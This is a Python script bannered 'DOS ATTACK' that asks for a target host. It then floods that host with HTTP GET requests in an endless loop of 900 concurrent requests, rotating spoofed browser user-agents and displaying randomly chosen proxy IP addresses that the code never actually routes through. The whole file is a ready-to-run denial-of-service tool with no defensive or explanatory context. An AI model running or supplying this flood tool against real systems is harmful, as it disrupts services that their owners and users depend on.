import aiohttp
import asyncio
import random
import os

os.system('cls' if os.name == 'nt' else 'clear')
def banner():
  print('''
DOS ATTACK 
COP : PHAM CHIEN
''')
banner()
HOST = input("HOST : ")

fake_usr_agent = [
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A4325c Safari/601.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36',
]

ip = [
    '112.185.252.34:8080',
    '185.162.231.249:80',
    '104.20.90.50:80',
    '142.93.6.130:16221',
    '172.67.181.156:80',
    '121.206.205.69:4134',
    '46.0.203.186:8080',
    '192.99.101.142:7497',
    '185.170.166.27:80',
    '124.105.55.176:30906',
    '45.170.102.89:999',
    '133.232.82.23:80',
    '185.238.228.206:80',
    '104.17.45.2:80',
    '172.67.192.55:80',
    '61.7.146.7:8082',
    '72.221.172.203:4145',
    '202.75.111.129:5678',
    '195.62.52.164:29520',
    '64.225.8.82:9981',
    '41.160.238.106:5678',
    '103.179.58.122:80',
    '188.166.252.135:8080',
    '104.18.40.99:80',
    '104.252.131.31:3128',
    '45.131.4.1:80',
    '37.207.45.15:48678',
    '185.162.231.188:80',
    '152.231.77.115:8080',
    '192.81.128.182:8089',
    '172.64.83.200:80',
    '156.239.51.66:3128',
]

while True:
    async def send_requests(fake_usr_agent, ip):
        async with aiohttp.ClientSession() as sessions:
            fake_ip = random.choice(ip)
            random_user = random.choice(fake_usr_agent)
            headers = {"User-Agent": random_user}
            async with sessions.get(HOST, headers=headers) as response:
                if response.status == 200:
                    print(f"[ {response.status} ] {fake_ip} --> {HOST}")

                elif response.status == 403:
                    print(f"[ {response.status} ] {fake_ip} --> {HOST}")
    
                elif response.status == 404:
                    print(f"[ {response.status} ] {fake_ip} --> {HOST}")
                   
                else:
                    print(f"[ {response.status} ] {fake_ip} --> {HOST}")

                return response.text()

    async def main_session():
        print("STARTING GETINGS SOCKET.......")
        ATTACKING_NUM = 900

        threads = []
        threads2 = []
        for i in range(ATTACKING_NUM):
            threadings = asyncio.ensure_future(send_requests(fake_usr_agent, ip))
            threads.append(threadings)
            threads2.append(threadings)

        await asyncio.gather(*threads)

    if __name__ == '__main__':
        loopendas = asyncio.get_event_loop()
        loopendas.run_until_complete(main_session())

print("ATTaCKING COMPLETE.....")
